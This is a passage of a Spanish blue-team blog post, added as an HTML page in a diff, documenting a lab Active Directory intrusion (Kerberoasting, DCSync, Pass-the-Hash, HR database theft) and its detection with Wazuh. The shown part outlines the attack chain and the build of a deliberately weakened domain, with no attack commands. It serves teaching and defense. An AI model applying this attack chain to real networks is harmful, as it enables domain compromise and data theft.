@@ -1,0 +1,1219 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="utf-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <title>Ciclo completo de incidente SOC — Intrusión en Active Directory y exfiltración de BBDD | Alejandro Orcajada</title>
+  <meta name="description" content="Lab SOC end-to-end bajo NIST SP 800-61 Rev. 3: intrusión en Active Directory (Kerberoasting, DCSync, Pass-the-Hash) y exfiltración de una BBDD de RRHH detectada y respondida con Wazuh."/>
+  <meta name="author" content="Alejandro Orcajada"/>
+  <meta name="theme-color" content="#0a0a0f"/>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css"/>
+  <link rel="stylesheet" href="articulo.css"/>
+  <style>
+    pre::-webkit-scrollbar { height: 6px; }
+    pre::-webkit-scrollbar-track { background: rgba(255,255,255,0.03); border-radius: 3px; }
+    pre::-webkit-scrollbar-thumb { background: rgba(0,255,170,0.25); border-radius: 3px; }
+    pre::-webkit-scrollbar-thumb:hover { background: rgba(0,255,170,0.45); }
+    .img-lab { width:100%; border-radius:var(--radius-md,10px); margin:1rem 0; border:1px solid var(--border,rgba(255,255,255,.08)); cursor:zoom-in; transition:opacity .2s,transform .2s; }
+    .img-lab:hover { opacity:.9; transform:scale(1.003); }
+    .img-caption { font-family:var(--font-mono,'JetBrains Mono',monospace); font-size:.7rem; color:var(--text-muted); text-align:center; margin:-6px 0 1rem; }
+    .callout-danger { background:rgba(255,85,85,.06); border-color:#ff5555; }
+    .callout-danger .callout-icon { color:#ff5555; }
+    .dual-panel { display:grid; grid-template-columns:1fr 1fr; gap:14px; margin:1.5rem 0; }
+    @media(max-width:700px){ .dual-panel{grid-template-columns:1fr;} }
+    .panel-attack { background:rgba(255,85,85,.04); border:1px solid rgba(255,85,85,.18); border-radius:var(--radius-md,10px); padding:16px 18px; }
+    .panel-defense { background:rgba(0,255,170,.03); border:1px solid rgba(0,255,170,.16); border-radius:var(--radius-md,10px); padding:16px 18px; }
+    .panel-attack h4 { font-family:var(--font-mono); font-size:.78rem; color:#ff5555; font-weight:700; margin-bottom:10px; }
+    .panel-defense h4 { font-family:var(--font-mono); font-size:.78rem; color:var(--accent,#00ffaa); font-weight:700; margin-bottom:10px; }
+    .panel-attack p, .panel-defense p { font-size:.87rem; color:var(--text-secondary); line-height:1.65; margin:0; }
+    .ioc-table { width:100%; border-collapse:collapse; margin:1rem 0; font-size:.83rem; }
+    .ioc-table th { background:rgba(255,85,85,.07); color:#ff5555; font-weight:600; padding:8px 14px; text-align:left; border-bottom:1px solid rgba(255,85,85,.2); font-family:var(--font-mono); font-size:.75rem; }
+    .ioc-table td { padding:7px 14px; border-bottom:1px solid var(--border); color:var(--text-secondary); font-size:.83rem; }
+    .ioc-table td:first-child { font-family:var(--font-mono); color:#ff5555; font-size:.78rem; }
+    .ioc-table td:nth-child(2) { font-family:var(--font-mono); color:#f1fa8c; font-size:.78rem; }
+    .ioc-table tr:last-child td { border-bottom:none; }
+    .sev-crit { color:#ff5555; font-weight:700; font-family:var(--font-mono); font-size:.78rem; }
+    .sev-high { color:#ff9f1a; font-weight:700; font-family:var(--font-mono); font-size:.78rem; }
+    .mitre-tag { font-family:var(--font-mono); font-size:.7rem; padding:2px 8px; border-radius:4px; background:rgba(255,85,85,.1); color:#ff5555; border:1px solid rgba(255,85,85,.2); margin-left:8px; }
+    .so-query { background:rgba(0,212,255,.04); border:1px solid rgba(0,212,255,.14); border-radius:var(--radius-md,10px); padding:14px 18px; margin:1rem 0; font-family:var(--font-mono); font-size:.82rem; color:#00d4ff; }
+    .so-query-label { font-size:.7rem; color:var(--text-muted); margin-bottom:6px; text-transform:uppercase; letter-spacing:.05em; }
+    .corr-box { background:rgba(189,147,249,.04); border:1px solid rgba(189,147,249,.18); border-radius:var(--radius-md,10px); padding:16px 20px; margin:1rem 0; }
+    .corr-box h4 { font-family:var(--font-mono); font-size:.8rem; color:#bd93f9; font-weight:700; margin-bottom:8px; text-transform:uppercase; letter-spacing:.05em; }
+    .corr-box p { font-size:.87rem; color:var(--text-secondary); line-height:1.65; margin:0; }
+    .stat-row { display:grid; grid-template-columns:repeat(auto-fit,minmax(130px,1fr)); gap:12px; margin:1.5rem 0; }
+    .stat-card { background:var(--bg-card,#111118); border:1px solid var(--border); border-radius:var(--radius-md,10px); padding:16px; text-align:center; }
+    .stat-val { font-family:var(--font-display); font-size:1.8rem; font-weight:700; display:block; margin-bottom:4px; }
+    .stat-val.red { color:#ff5555; }
+    .stat-val.green { color:#00ffaa; }
+    .stat-val.cyan { color:#00d4ff; }
+    .stat-label { font-size:.72rem; color:var(--text-muted); font-family:var(--font-mono); }
+    .vm-row { display:grid; grid-template-columns:repeat(auto-fit,minmax(185px,1fr)); gap:12px; margin:1.5rem 0; }
+    .vm-card { background:var(--bg-card,#111118); border:1px solid var(--border); border-radius:var(--radius-md,10px); padding:14px 16px; }
+    .vm-label { font-family:var(--font-mono); font-size:.68rem; color:#00ffaa; display:block; margin-bottom:5px; text-transform:uppercase; letter-spacing:.06em; }
+    .vm-card h4 { font-size:.92rem; font-weight:600; color:var(--text-primary); margin-bottom:6px; }
+    .vm-card p { font-size:.77rem; color:var(--text-muted); line-height:1.55; font-family:var(--font-mono); margin:0; }
+    /* Lightbox */
+    #lb-overlay { position:fixed; inset:0; z-index:9999; display:flex; align-items:center; justify-content:center; flex-direction:column; gap:14px; background:rgba(5,5,10,.93); backdrop-filter:blur(12px); opacity:0; visibility:hidden; transition:opacity .3s,visibility .3s; }
+    #lb-overlay.lb-open { opacity:1; visibility:visible; }
+    #lb-img-wrap { max-width:min(92vw,1200px); max-height:80vh; transform:scale(.93) translateY(12px); transition:transform .35s cubic-bezier(.22,.68,0,1.2); }
+    #lb-overlay.lb-open #lb-img-wrap { transform:scale(1) translateY(0); }
+    #lb-img { display:block; max-width:100%; max-height:80vh; border-radius:8px; border:1px solid rgba(0,255,170,.18); box-shadow:0 24px 80px rgba(0,0,0,.8); object-fit:contain; }
+    #lb-caption { font-family:var(--font-mono); font-size:.76rem; color:rgba(255,255,255,.5); text-align:center; max-width:min(92vw,800px); }
+    #lb-close { position:fixed; top:20px; right:24px; width:40px; height:40px; border-radius:50%; background:rgba(255,255,255,.08); border:1px solid rgba(255,255,255,.15); color:#fff; font-size:1.1rem; cursor:pointer; display:flex; align-items:center; justify-content:center; transition:.2s; }
+    #lb-close:hover { background:rgba(255,85,85,.25); transform:scale(1.1); }
+    #lb-hint { position:fixed; bottom:18px; left:50%; transform:translateX(-50%); font-family:var(--font-mono); font-size:.65rem; color:rgba(255,255,255,.22); pointer-events:none; }
+    .lb-arrow { position:fixed; top:50%; transform:translateY(-50%); width:46px; height:46px; border-radius:50%; background:rgba(255,255,255,.07); border:1px solid rgba(255,255,255,.12); color:rgba(255,255,255,.7); font-size:1rem; cursor:pointer; display:flex; align-items:center; justify-content:center; transition:.2s; }
+    .lb-arrow:hover { background:rgba(0,255,170,.15); color:#00ffaa; }
+    #lb-prev { left:20px; } #lb-next { right:20px; }
+    .code-block-wrap { position:relative; max-height:220px; overflow:hidden; transition:max-height .4s ease; }
+    .code-block-wrap.expanded { max-height:9999px; }
+    .code-block-wrap.expanded::after { opacity:0; }
+    .code-block-wrap .code-block { border-bottom-left-radius:0; border-bottom-right-radius:0; margin-bottom:0; }
+    .code-expand-btn { display:flex; align-items:center; justify-content:center; gap:6px; width:100%; padding:7px 16px; background:rgba(0,255,170,.04); border:none; border-top:none !important; color:rgba(0,255,170,.45); cursor:pointer; font-size:.72rem; font-family:var(--font-mono); transition:.2s; border-radius:0 0 var(--radius-md,10px) var(--radius-md,10px); }
+    .code-expand-btn:hover { background:rgba(0,255,170,.08); color:#00ffaa; }
+    .code-expand-btn i { transition:transform .3s; }
+    .code-expand-btn.open i { transform:rotate(180deg); }
+    .code-lang-red { color:#ff5555 !important; }
+    .summary-table { width:100%; border-collapse:collapse; margin:1.5rem 0; font-size:.85rem; }
+    .summary-table th { background:rgba(0,255,170,.08); color:#00ffaa; font-weight:600; padding:10px 14px; text-align:left; border-bottom:1px solid rgba(0,255,170,.2); font-family:var(--font-mono); font-size:.78rem; }
+    .summary-table td { padding:8px 14px; border-bottom:1px solid var(--border); color:var(--text-secondary); font-size:.85rem; }
+    .summary-table td:first-child { font-family:var(--font-mono); color:#00ffaa; font-size:.8rem; }
+    .summary-table tr:last-child td { border-bottom:none; }
+
+    /* === Retoques finales: grupos de color + sin barra TOC === */
+    .toc-progress { display:none !important; }
+    .grp-prep   h2, .grp-prep   .section-number { color: var(--accent, #00ffaa); }
+    .grp-attack h2, .grp-attack .section-number { color: #ff5555; }
+    .grp-soc    h2, .grp-soc    .section-number { color: #00d4ff; }
+    .grp-prep   h3 { border-left:3px solid var(--accent,#00ffaa); padding-left:12px; }
+    .grp-attack h3 { border-left:3px solid #ff5555; padding-left:12px; }
+    .grp-soc    h3 { border-left:3px solid #00d4ff; padding-left:12px; }
+
+    /* === Mejoras visuales: TOC mas grande, tipografia y movil === */
+    .article-layout { grid-template-columns: 270px 1fr; gap: 64px; }
+    .toc-container { top: 96px; }
+    .toc-title { font-size: 13px; letter-spacing: 1.2px; margin-bottom: 18px; }
+    .toc-nav { gap: 7px; padding-left: 18px; border-left-width: 2px; }
+    .toc-link { font-size: 15px; padding: 9px 0; line-height: 1.35; }
+    .toc-link.active { font-weight: 600; }
+    .toc-link.active::before { height: 22px; left: -19px; }
+    .content-section h2 { font-size: 30px; margin-bottom: 26px; }
+    .content-section h3 { font-size: 21px; margin-top: 36px; }
+    .section-number { font-size: 15px; }
+    .lead { font-size: 19px; }
+    .content-section p { font-size: 16px; }
+    pre { overflow-x: auto; -webkit-overflow-scrolling: touch; }
+    .so-query { word-break: break-word; }
+
+    /* Tablet: una columna (sin TOC, ya oculto en articulo.css) */
+    @media (max-width: 1024px) {
+      .article-layout { grid-template-columns: 1fr; gap: 0; }
+    }
+    /* Movil */
+    @media (max-width: 768px) {
+      .content-section h2 { font-size: 23px; gap: 10px; margin-bottom: 18px; }
+      .content-section h3 { font-size: 18px; margin: 26px 0 12px; }
+      .lead { font-size: 17px; }
+      .content-section p { font-size: 15.5px; line-height: 1.75; }
+      .code-block code { font-size: 12px; }
+      .code-header { flex-wrap: wrap; gap: 6px; }
+      .ioc-table, .summary-table { font-size: 12px; }
+      .ioc-table th, .ioc-table td,
+      .summary-table th, .summary-table td { padding: 6px 9px; word-break: break-word; }
+      .so-query { font-size: 12.5px; padding: 12px 14px; }
+      .stat-val { font-size: 1.5rem; }
+      .vm-card, .panel-attack, .panel-defense, .corr-box { padding: 14px 16px; }
+      .img-lab { margin: 0.8rem 0; }
+    }
+    @media (max-width: 480px) {
+      .content-section h2 { font-size: 21px; }
+      .stat-row { grid-template-columns: repeat(auto-fit, minmax(118px,1fr)); }
+    }
+  </style>
+</head>
+<body>
+
+<div id="lb-overlay" role="dialog" aria-modal="true">
+  <button id="lb-close">&#x2715;</button>
+  <button class="lb-arrow" id="lb-prev">&#8592;</button>
+  <div id="lb-img-wrap"><img id="lb-img" src="" alt=""></div>
+  <p id="lb-caption"></p>
+  <button class="lb-arrow" id="lb-next">&#8594;</button>
+  <span id="lb-hint">ESC · ← → para navegar</span>
+</div>
+
+<div class="noise"></div>
+<div class="grid-bg"></div>
+<div class="spotlight" id="spotlight"></div>
+<div class="reading-progress" id="reading-progress"></div>
+
+<nav class="navbar">
+  <div class="nav-container">
+    <a href="index.html" class="nav-logo"><span class="logo-text">AO</span><span class="logo-dot"></span></a>
+    <div class="nav-links">
+      <a href="index.html" class="nav-item">Inicio</a>
+      <a href="blog.html" class="nav-item">Blog</a>
+    </div>
+    <div class="nav-social">
+      <a href="https://github.com/tuusuario" target="_blank" rel="noopener"><i class="fab fa-github"></i></a>
+      <a href="https://linkedin.com/in/tuusuario" target="_blank" rel="noopener"><i class="fab fa-linkedin-in"></i></a>
+    </div>
+  </div>
+</nav>
+
+<header class="article-header">
+  <a href="blog.html" class="back-link"><i class="fas fa-arrow-left"></i><span>Volver al blog</span></a>
+  <div class="article-meta-top">
+    <span class="category-badge">SOC · Blue Team</span>
+    <span class="subcategory">Active Directory · Wazuh · Respuesta a incidentes · MITRE ATT&amp;CK</span>
+  </div>
+  <h1 class="article-title">Ciclo completo de incidente SOC: intrusión en Active Directory y exfiltración de una BBDD</h1>
+  <p class="article-excerpt">
+    Lab SOC end-to-end sobre un dominio Windows Server simulado en VirtualBox. Un atacante parte de unas credenciales
+    filtradas y encadena Kerberoasting, DCSync, Pass-the-Hash y el robo de la base de datos de RRHH. Desde el lado defensa
+    lo detectamos, correlacionamos y respondemos con Wazuh siguiendo las funciones del CSF 2.0 de NIST SP 800-61 Rev. 3:
+    detección, contención, erradicación, recuperación y cierre con métricas y notificación a la AEPD.
+  </p>
+  <div class="article-info">
+    <div class="author-info">
+      <div class="author-avatar">AO</div>
+      <div class="author-details">
+        <span class="author-name">Alejandro Orcajada</span>
+        <span class="author-role">Ciberseguridad · SOC · Blue Team</span>
+      </div>
+    </div>
+    <div class="article-stats">
+      <span class="stat"><i class="fas fa-calendar"></i> May 2026</span>
+      <span class="stat"><i class="fas fa-clock"></i> 50 min lectura</span>
+      <span class="stat"><i class="fas fa-shield-alt"></i> Lab ejecutado</span>
+    </div>
+  </div>
+  <div class="article-tags">
+    <span class="tag">Wazuh</span>
+    <span class="tag">Active Directory</span>
+    <span class="tag">NIST 800-61 r3</span>
+    <span class="tag">Kerberoasting</span>
+    <span class="tag">DCSync</span>
+    <span class="tag">Pass-the-Hash</span>
+    <span class="tag">Sysmon</span>
+    <span class="tag">MITRE ATT&amp;CK</span>
+    <span class="tag">RGPD</span>
+  </div>
+</header>
+
+<main class="article-layout">
+
+  <aside class="toc-sidebar">
+    <div class="toc-container">
+      <h4 class="toc-title"><i class="fas fa-list"></i>Contenido</h4>
+      <nav class="toc-nav">
+        <a href="#intro"        class="toc-link active">Introducción</a>
+        <a href="#marcos"       class="toc-link">Marcos normativos</a>
+        <a href="#objetivos"    class="toc-link">Objetivos</a>
+        <a href="#escenario"    class="toc-link">Escenario</a>
+        <a href="#ataque"       class="toc-link">Cadena de ataque</a>
+        <a href="#deteccion"    class="toc-link">SOC · Detección</a>
+        <a href="#correlacion"  class="toc-link">SOC · Correlación</a>
+        <a href="#contencion"   class="toc-link">SOC · Contención</a>
+        <a href="#recuperacion" class="toc-link">SOC · Recuperación</a>
+        <a href="#cierre"       class="toc-link">SOC · Cierre y AEPD</a>
+        <a href="#conclusion"   class="toc-link">Conclusión</a>
+        <a href="#biblio"       class="toc-link">Bibliografía</a>
+      </nav>
+    </div>
+  </aside>
+
+  <article class="article-content">
+
+
+<!-- ══ INTRODUCCIÓN ══ -->
+    <section id="intro" class="content-section">
+      <h2><span class="section-number">01</span> Introducción</h2>
+
+      <p class="lead">
+        ¡Buenas! En esta entrada vamos a recorrer un ciclo completo de SOC de principio a fin: desde que un atacante pone un pie en el dominio hasta que el incidente queda cerrado y documentado. El enfoque es totalmente práctico — un ataque real ejecutado contra un Active Directory y, sobre todo, cómo se detecta, correlaciona y responde desde el lado defensor.
+      </p>
+
+      <p>
+        La parte que de verdad importa aquí no es el ataque, es lo que viene después: cómo un analista convierte un puñado de alertas sueltas en una historia coherente y toma decisiones. Para que no sea "monté un SIEM y ya", todo el proceso va guiado por un marco profesional, <strong>NIST SP 800-61 Rev. 3</strong>, y cada técnica del atacante queda mapeada con <strong>MITRE ATT&amp;CK</strong>.
+      </p>
+
+      <p>
+        Si te interesa con qué frecuencia sufren las empresas este tipo de incidentes (filtración de credenciales y robo de bases de datos), el informe anual <em>Verizon DBIR</em> y el <em>ENISA Threat Landscape</em> dan datos bastante reveladores.
+      </p>
+
+      <div class="callout callout-info">
+        <div class="callout-icon"><i class="fas fa-info-circle"></i></div>
+        <div class="callout-content">
+          <strong>Perspectiva dual: atacante y analista</strong>
+          <p>Primero ejecutamos y explicamos el ataque entero desde Kali. Después nos ponemos del lado del SOC y vemos qué llega a Wazuh en cada paso. Es la misma dinámica de un SOC real: el analista no sabe de antemano qué va a pasar, tiene que leer las alertas, correlacionarlas y decidir.</p>
+        </div>
+      </div>
+    </section>
+
+
+    <!-- ══ MARCOS NORMATIVOS ══ -->
+    <section id="marcos" class="content-section">
+      <h2><span class="section-number">02</span> Marcos normativos</h2>
+
+      <p>
+        El marco principal es <strong>NIST SP 800-61 Rev. 3</strong> — <em>"Incident Response Recommendations and Considerations for Cybersecurity Risk Management: A CSF 2.0 Community Profile"</em>, publicado el 3 de abril de 2025. Es la referencia internacional para gestión de incidentes y, a diferencia de la Rev. 2 (retirada esa misma fecha), ya no usa el clásico ciclo de cuatro fases: se reorganiza sobre las <strong>seis Funciones del CSF 2.0</strong>. En este lab etiqueto cada fase de mi trabajo con la Función que cubre.
+      </p>
+
+      <div class="summary-table" style="overflow-x:auto">
+        <table class="summary-table">
+          <thead><tr><th>Marco</th><th>Para qué lo uso</th></tr></thead>
+          <tbody>
+            <tr><td>NIST SP 800-61 Rev. 3 / CSF 2.0</td><td>La espina dorsal. Estructura todo el lado defensa en las Funciones Detect, Respond y Recover (y Govern/Identify/Protect en la preparación)</td></tr>
+            <tr><td>MITRE ATT&amp;CK</td><td>Lenguaje común para mapear las técnicas del atacante (TTPs) con su identificador</td></tr>
+            <tr><td>RGPD — arts. 33 y 34</td><td>Como el ataque acaba en robo de datos personales (DNI, IBAN, salario), justifica la notificación a la AEPD</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <div class="callout callout-info">
+        <div class="callout-icon"><i class="fas fa-lightbulb"></i></div>
+        <div class="callout-content">
+          <strong>Cómo aplico el marco (sin sobrecargar)</strong>
+          <p>Cada fase del lado SOC abre con una línea corta del tipo "esto en la Rev. 3 cae en la Función X". El marco etiqueta todo el recorrido, pero solo se explica a fondo una vez, en el cierre con la notificación a la AEPD.</p>
+        </div>
+      </div>
+    </section>
+
+
+    <!-- ══ OBJETIVOS ══ -->
+    <section id="objetivos" class="content-section">
+      <h2><span class="section-number">03</span> Objetivos</h2>
+
+      <p>
+        El objetivo "oficial" de este laboratorio es… darme trabajo, claro. Ahora en serio: documentar de principio a fin un ciclo SOC profesional sobre un caso realista bajo NIST SP 800-61 Rev. 3, justificando en cada paso qué medida, comando o razonamiento empleo y por qué.
+      </p>
+
+      <p>El recorrido cubre las dos caras del incidente:</p>
+
+      <ol style="margin:1rem 0 1rem 1.5rem; color:var(--text-secondary); line-height:2;">
+        <li>Reconocimiento y acceso inicial con credenciales filtradas</li>
+        <li>Kerberoasting de una cuenta de servicio y crackeo offline</li>
+        <li>DCSync (volcado del NTDS) y robo de un hash de administrador</li>
+        <li>Movimiento lateral con Pass-the-Hash y acceso a la base de datos de RRHH</li>
+        <li>Exfiltración de los datos y borrado de huellas</li>
+      </ol>
+
+      <p>
+        Y, lo más importante, el lado SOC: detectar cada paso en Wazuh, correlacionar las alertas en un único incidente, contener, erradicar la causa raíz, recuperar el servicio y cerrar el caso con métricas, IOCs y la notificación legal. El foco no es solo detectar — es <strong>interpretar para actuar</strong>.
+      </p>
+    </section>
+
+
+    <!-- ══ ESCENARIO ══ -->
+    <section id="escenario" class="content-section grp-prep">
+      <h2><span class="section-number">04</span> Escenario y configuración</h2>
+
+      <p>
+        Lab montado en VirtualBox sobre una red interna aislada <code>192.168.60.0/24</code>. Cinco máquinas: el dominio, el servidor de base de datos, una estación de trabajo, el SIEM y la Kali atacante.
+      </p>
+
+      <div class="vm-row">
+        <div class="vm-card">
+          <span class="vm-label">Controlador de dominio</span>
+          <h4>AOM-AD1 — Win Server 2022</h4>
+          <p>192.168.60.10<br>Dominio AOM-SOC.lab + DNS<br>Sysmon · agente Wazuh</p>
+        </div>
+        <div class="vm-card">
+          <span class="vm-label">Servidor miembro + SQL</span>
+          <h4>AOM-AD2 — Win Server 2022</h4>
+          <p>192.168.60.20<br>SQL Server Express (svc_sql)<br>BBDD RRHH · SQL Audit</p>
+        </div>
+        <div class="vm-card">
+          <span class="vm-label">Estación de trabajo</span>
+          <h4>Estacion-W10 — Windows 10</h4>
+          <p>192.168.60.30<br>Usuario Fran<br>Unida al dominio</p>
+        </div>
+        <div class="vm-card">
+          <span class="vm-label">SIEM — Blue Team</span>
+          <h4>Wazuh</h4>
+          <p>192.168.60.40<br>Manager + Indexer + Dashboard<br>Módulo MITRE ATT&amp;CK</p>
+        </div>
+        <div class="vm-card">
+          <span class="vm-label">Atacante</span>
+          <h4>Kali (aom-kali-soc)</h4>
+          <p>192.168.60.100<br>Impacket · NetExec · hashcat<br>evil-winrm · BloodHound</p>
+        </div>
+      </div>
+
+      <h3>Telemetría SOC desplegada</h3>
+
+      <p>
+        Antes de que ocurra nada, hay que asegurar la telemetría — esto en la Rev. 3 son las Funciones <strong>Govern, Identify y Protect</strong> (el "antes del incidente"). Sin logs no hay detección. En cada servidor activé por GPO siete subcategorías de auditoría, cada una alimenta una detección concreta:
+      </p>
+
+      <div class="summary-table" style="overflow-x:auto">
+        <table class="summary-table">
+          <thead><tr><th>Auditoría (GPO)</th><th>Genera</th><th>Detecta en este lab</th></tr></thead>
+          <tbody>
+            <tr><td>Account Logon</td><td>4768 / 4769</td><td>Kerberoasting</td></tr>
+            <tr><td>Logon/Logoff</td><td>4624 / 4625</td><td>Pass-the-Hash, acceso anómalo</td></tr>
+            <tr><td>Account Management</td><td>4720 / 4728 / 4732</td><td>Altas y cambios de cuentas/grupos</td></tr>
+            <tr><td>DS Access (Object Access)</td><td>4662</td><td>DCSync (replicación)</td></tr>
+            <tr><td>Privilege Use</td><td>4672 / 4673</td><td>Privilegios de administrador</td></tr>
+            <tr><td>Policy Change</td><td>4719 / 1102</td><td>Borrado del log de seguridad</td></tr>
+            <tr><td>Detailed Tracking</td><td>4688 (con línea de comandos)</td><td>Procesos sospechosos</td></tr>
+          </tbody>
+        </table>
+      </div>
+
+      <p>
+        Además: <strong>Sysmon</strong> con configuración base, <strong>SQL Server Audit</strong> en AOM-AD2 (login y acceso a objetos del esquema) y el <strong>agente Wazuh</strong> enrolado en las tres máquinas Windows contra <code>192.168.60.40</code>.
+      </p>
+
+      <h3>Montaje paso a paso</h3>
+      <p>El laboratorio se monta en tres bloques: el dominio con su telemetría (AOM-AD1), el servidor SQL con la base de datos (AOM-AD2) y el enrolado de agentes en el SIEM.</p>
+
+      <h4 style="color:var(--accent,#00ffaa);font-family:var(--font-mono);font-size:.82rem;margin:1.4rem 0 .6rem;letter-spacing:.04em">AOM-AD1 — Dominio, cuentas y telemetría</h4>
+
+      <img src="herramientas descargadas y listas en ad 1.png" alt="Herramientas de telemetría descargadas en AD1" class="img-lab">
+      <p>Antes de tocar nada, dejo en AD1 todo lo necesario para la telemetría: el ejecutable de Sysmon con su fichero de configuración y el instalador del agente de Wazuh. Tenerlo preparado de antemano evita cortes a mitad del montaje.</p>
+      <img src="AD 1 intalacion de dominio y dns.png" alt="Instalación del dominio y DNS en AD1" class="img-lab">
+      <p>Promociono el servidor a controlador de dominio creando el bosque <code>AOM-SOC.lab</code>. Durante el proceso instalo también el servicio DNS, imprescindible para que el dominio resuelva nombres internamente. Antes le asigné una IP estática fija (192.168.60.10), porque un DC no puede cambiar de dirección.</p>
+      <img src="las uo credas y verificadas ad1.png" alt="Unidades organizativas creadas y verificadas en AD1" class="img-lab">
+      <p>Creo las unidades organizativas que ordenan el dominio (Empleados, Servidores, CuentasServicio…) y verifico que se han creado correctamente. Separar las cuentas por OU me permitirá aplicar después las políticas de auditoría de forma ordenada.</p>
+      <img src="crear user fran ad1.png" alt="Creación del usuario fran en AD1" class="img-lab">
+      <p>Doy de alta a <code>fran</code>, nuestro empleado. Le pongo una contraseña débil a propósito: será el punto de entrada del atacante, simulando unas credenciales filtradas que nadie se molestó en rotar.</p>
+      <img src="Usuario paco.png" alt="Creación del usuario paco en AD1" class="img-lab">
+      <p>Creo a <code>paco</code>, el administrador de sistemas. Es la cuenta privilegiada que el atacante querrá robar para hacerse con el control del dominio.</p>
+      <img src="crear user svcsql ad1.png" alt="Creación de la cuenta de servicio svc_sql" class="img-lab">
+      <p>Creo <code>svc_sql</code>, la cuenta de servicio con la que el SQL de AD2 operará contra el dominio. Es una cuenta de servicio normal… salvo por un par de detalles que la convertirán en el eslabón débil de toda la cadena.</p>
+      <img src="verificamos los users y set spn en ad 1.png" alt="Verificación de usuarios y registro del SPN de svc_sql" class="img-lab">
+      <p>Verifico que las tres cuentas existen y registro el <strong>SPN</strong> de svc_sql con <code>setspn</code>. Ese SPN, necesario para que el servicio SQL funcione, es justo lo que más tarde habilita el Kerberoasting: cualquier usuario del dominio podrá pedir su ticket.</p>
+      <img src="crelar la gpo y unirla al dominio ad 1.png" alt="Creación y enlace de la GPO de auditoría" class="img-lab">
+      <p>Empiezo la telemetría creando una GPO de auditoría y enlazándola al dominio para que se aplique a todos los equipos. Aquí defino qué eventos de seguridad quiero que Windows registre.</p>
+      <img src="gpo ad 1 object access.png" alt="Configuración de auditoría Object Access (DS Access)" class="img-lab">
+      <p>Activo la subcategoría <strong>Object Access / DS Access</strong>. Es la clave del lab: sin ella, el DCSync ocurriría sin dejar rastro; con ella, la replicación del directorio genera el evento 4662 que luego detectaremos.</p>
+      <img src="gpo privilegie use gpo ad 1.png" alt="Configuración de auditoría Privilege Use" class="img-lab">
+      <p>Configuro <strong>Privilege Use</strong> (genera el 4672, uso de privilegios de administrador). En el resto de GPOs activo las demás subcategorías: Account Logon, Account Management, Process Creation, Logon/Logoff, Policy Change y Detailed Tracking — siete en total, cada una vigilando una técnica distinta.</p>
+      <img src="comrpobacion de gpos lista adit ad 1.png" alt="Verificación con auditpol de las subcategorías activas" class="img-lab">
+      <p>Tras aplicar las políticas con <code>gpupdate</code>, compruebo con <code>auditpol /get</code> que las siete subcategorías están activas en Success y Failure. Si esto no estuviera bien, el resto del laboratorio no detectaría absolutamente nada.</p>
+      <img src="arrancar sysmon en ad 1.png" alt="Instalación de Sysmon en AD1" class="img-lab">
+      <p>Instalo Sysmon con una configuración base. Complementa los logs nativos de Windows con telemetría más rica de procesos, conexiones y cambios, que Wazuh recoge igual que el resto.</p>
+      <img src="comprobamos que sysmon funcona ad1.png" alt="Verificación de que Sysmon registra actividad" class="img-lab">
+      <p>Confirmo que Sysmon está registrando eventos activamente. Con esto AD1 ya genera toda la telemetría que necesitamos; solo falta enviarla a Wazuh, que dejo para el final.</p>
+      <h4 style="color:var(--accent,#00ffaa);font-family:var(--font-mono);font-size:.82rem;margin:1.4rem 0 .6rem;letter-spacing:.04em">AOM-AD2 — Servidor SQL y base de datos</h4>
+
+      <img src="comprovar que unimos al dominio ad 2.png" alt="AOM-AD2 unido al dominio" class="img-lab">
+      <p>Uno el segundo servidor, AOM-AD2, al dominio <code>AOM-SOC.lab</code>. A diferencia de AD1, este no es controlador de dominio: es un servidor miembro que alojará el SQL.</p>
+      <img src="ad 2 escogemos que version de sql queremos.png" alt="Instalación de SQL Server" class="img-lab">
+      <p>Instalo SQL Server Express, más que suficiente para el lab. Es donde vivirá la base de datos de RRHH que el atacante quiere robar.</p>
+      <img src="en la configuracion sql hacemos esto pa entrar por svc ad 2.png" alt="Configuración del servicio SQL bajo svc_sql" class="img-lab">
+      <p>En la configuración del servicio indico que el motor SQL corra bajo la cuenta de dominio <code>svc_sql</code> en lugar de una cuenta local. Esto es lo que liga el SQL al dominio… y lo que da sentido al Kerberoasting de svc_sql que veremos en el ataque.</p>
+      <img src="confirmar que el sql bajo cuenta svc ad 2.png" alt="Confirmación del servicio MSSQL bajo svc_sql" class="img-lab">
+      <p>Confirmo que el servicio MSSQL está corriendo efectivamente bajo <code>svc_sql</code>. Ya tenemos la cuenta de servicio ligada al motor de base de datos.</p>
+      <img src="crear datos para bbdd ad 2.png" alt="Generación de datos ficticios para la BBDD" class="img-lab">
+      <p>Genero datos ficticios pero realistas con Mockaroo: nombre, DNI, IBAN, salario y departamento de unos 1000 empleados. Son datos personales y económicos — justo el tipo de información que dispara el RGPD si se filtra.</p>
+      <img src="importar la data ara bbdd ad 2.png" alt="Importación de los datos a la base de datos" class="img-lab">
+      <p>Importo esos datos a la base de datos <code>RRHH</code> dentro del SQL. Ya tenemos el objetivo del ataque cargado y listo.</p>
+      <img src="comprobacion buena de info en bbdd ad 2.png" alt="Verificación de los datos cargados en la BBDD" class="img-lab">
+      <p>Verifico con una consulta que los registros están correctamente cargados. La caja fuerte está llena; ahora toca vigilarla.</p>
+      <img src="para sql registre comandos ad 2.png" alt="Configuración de SQL Server Audit" class="img-lab">
+      <p>Configuro <strong>SQL Server Audit</strong> para que registre los inicios de sesión y los accesos a objetos de la base de datos. Esta es la telemetría que luego delata la exfiltración: sin ella, el robo de datos pasaría desapercibido a nivel de SQL.</p>
+      <h4 style="color:var(--accent,#00ffaa);font-family:var(--font-mono);font-size:.82rem;margin:1.4rem 0 .6rem;letter-spacing:.04em">SIEM — Enrolado de agentes Wazuh</h4>
+
+      <img src="crear los intaladores de wazuh.png" alt="Generación del comando de despliegue del agente Wazuh" class="img-lab">
+      <p>Desde el panel de Wazuh genero el comando de despliegue del agente, configurándolo contra la IP del manager (192.168.60.40). El propio panel me da el comando ya preparado según el sistema operativo de cada máquina.</p>
+      <img src="los agentes listos.png" alt="Panel de agentes Wazuh — los tres equipos activos" class="img-lab">
